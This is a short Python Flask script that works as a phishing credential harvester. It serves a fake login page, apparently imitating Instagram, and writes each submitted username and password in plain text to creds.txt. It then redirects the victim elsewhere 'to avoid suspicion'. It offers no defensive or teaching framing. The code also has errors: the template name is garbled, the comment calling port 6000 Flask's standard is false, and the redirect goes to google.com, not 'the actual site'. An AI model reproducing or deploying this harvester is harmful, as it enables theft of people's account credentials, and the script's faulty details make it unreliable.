from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# This route serves the fake login page
@app.route('/')
def index():
    return render_template('login.instagram username ')

# This route captures the posted data
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Log the credentials to a text file
    with open("creds.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    
    # Redirect the user to the actual site to avoid suspicion
    return redirect("https://www.google.com")

if __name__ == "__main__":
    # Standard Flask port is 6000
    app.run(host='0.0.0.0', port=6000)
